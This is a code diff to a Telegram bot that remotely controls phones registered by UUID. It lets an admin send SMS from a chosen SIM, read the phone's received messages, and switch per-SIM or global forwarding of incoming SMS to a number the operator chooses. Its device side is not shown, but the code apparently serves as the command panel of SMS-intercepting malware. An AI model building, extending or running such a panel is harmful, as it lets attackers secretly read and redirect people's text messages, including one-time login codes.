@@ -135,10 +135,12 @@ bot.on('callback_query', cb => {
   const chatId = cb.message.chat.id;
   if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, { text: '❌ Not allowed' });
 
-  const [cmd, uuid] = cb.data.split(':');
+  const parts = cb.data.split(':');
+  const cmd = parts[0];
+  const uuid = parts.length > 1 ? parts[parts.length - 1] : null;
   const device = devices.get(uuid);
 
-  if (!device) return bot.answerCallbackQuery(cb.id, { text: '❌ Device not found' });
+  if (uuid && !device) return bot.answerCallbackQuery(cb.id, { text: '❌ Device not found' });
 
   switch (cmd) {
     case 'device_menu':
@@ -150,7 +152,8 @@ bot.on('callback_query', cb => {
           inline_keyboard: [
             [{ text: '📤 Send SMS', callback_data: `send_sms:${uuid}` }],
             [{ text: '📥 Receive SMS', callback_data: `receive_sms:${uuid}` }],
-            [{ text: '📡 SMS Forward', callback_data: `forward_menu:${uuid}` }]
+            [{ text: '📡 Set Forward Number', callback_data: `set_forward_menu:${uuid}` }],
+            [{ text: '🔄 Toggle Forwarding', callback_data: `toggle_forward_menu:${uuid}` }]
           ]
         }
       });
@@ -159,16 +162,16 @@ bot.on('callback_query', cb => {
       return bot.editMessageText(`Choose SIM for ${device.model}:`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
-        reply_markup: { inline_keyboard: [[
-          { text: 'SIM1', callback_data: `send_sms_sim1:${uuid}` },
-          { text: 'SIM2', callback_data: `send_sms_sim2:${uuid}` }
+        reply_markup: { inline_keyboard: [[ 
+          { text: 'SIM1', callback_data: `send_sms_sim:1:${uuid}` },
+          { text: 'SIM2', callback_data: `send_sms_sim:2:${uuid}` }
         ]] }
       });
 
-    case 'send_sms_sim1':
-    case 'send_sms_sim2':
-      sessions[chatId] = { stage: 'await_sms_number', sim: cmd.includes('sim2') ? 2 : 1, uuid };
-      bot.sendMessage(chatId, '📞 Enter recipient number:');
+    case 'send_sms_sim':
+      const simToSend = parts[1];
+      sessions[chatId] = { stage: 'await_sms_number', sim: simToSend, uuid };
+      bot.sendMessage(chatId, `📞 Enter recipient number for SIM${simToSend}:`);
       return bot.answerCallbackQuery(cb.id);
 
     case 'receive_sms':
@@ -182,20 +185,64 @@ bot.on('callback_query', cb => {
       });
       return bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
 
-    case 'forward_menu':
-      return bot.editMessageText(`Choose SIM for forward (${device.model}):`, {
+    case 'set_forward_menu':
+      return bot.editMessageText(`Set forwarding number for which SIM on ${device.model}?`, {
         chat_id: chatId,
         message_id: cb.message.message_id,
-        reply_markup: { inline_keyboard: [[
-          { text: 'SIM1', callback_data: `forward_sim1:${uuid}` },
-          { text: 'SIM2', callback_data: `forward_sim2:${uuid}` }
+        reply_markup: { inline_keyboard: [[ 
+          { text: 'SIM1', callback_data: `set_forward_action:1:${uuid}` },
+          { text: 'SIM2', callback_data: `set_forward_action:2:${uuid}` }
         ]] }
       });
 
-    case 'forward_sim1':
-    case 'forward_sim2':
-      sessions[chatId] = { stage: 'await_forward_number', sim: cmd.includes('sim2') ? 2 : 1, uuid };
-      bot.sendMessage(chatId, `📡 Enter number to forward SMS (SIM${sessions[chatId].sim}):`);
+    case 'set_forward_action':
+      const simToSet = parts[1];
+      const forwardActionKeyboard = {
+        inline_keyboard: [
+          [
+            { text: '✅ Enable/Change Number', callback_data: `enable_forward:${simToSet}:${uuid}` },
+            { text: '❌ Disable Forwarding', callback_data: `disable_forward:${simToSet}:${uuid}` }
+          ]
+        ]
+      };
+      return bot.editMessageText(`Choose action for SIM ${simToSet} on ${device.model}:`, {
+        chat_id: chatId,
+        message_id: cb.message.message_id,
+        reply_markup: forwardActionKeyboard
+      });
+
+    case 'enable_forward':
+      const simToEnable = parts[1];
+      sessions[chatId] = { stage: 'await_forward_number', sim: simToEnable, uuid };
+      bot.sendMessage(chatId, `📡 Enter number to forward SMS to for SIM${simToEnable}:`);
+      return bot.answerCallbackQuery(cb.id);
+
+    case 'disable_forward':
+      const simToDisable = parts[1];
+      addCommand(uuid, { type: 'sms_forward', action: 'off', sim: simToDisable });
+      bot.editMessageText(`✅ Forwarding number removed for SIM${simToDisable} on ${device.model}.`, {
+        chat_id: chatId,
+        message_id: cb.message.message_id
+      });
+      return bot.answerCallbackQuery(cb.id);
+
+    case 'toggle_forward_menu':
+       return bot.editMessageText(`Set global forwarding status for ${device.model}:`, {
+        chat_id: chatId,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[ 
+          { text: '🟢 Forwarding ON', callback_data: `forward_global:on:${uuid}` },
+          { text: '🔴 Forwarding OFF', callback_data: `forward_global:off:${uuid}` }
+        ]] }
+      });
+
+    case 'forward_global':
+      const status = parts[1];
+      addCommand(uuid, { type: 'forward_global', status: status });
+      bot.editMessageText(`✅ Global SMS forwarding set to ${status.toUpperCase()} for ${device.model}.`, {
+        chat_id: chatId,
+        message_id: cb.message.message_id
+      });
       return bot.answerCallbackQuery(cb.id);
 
     default:
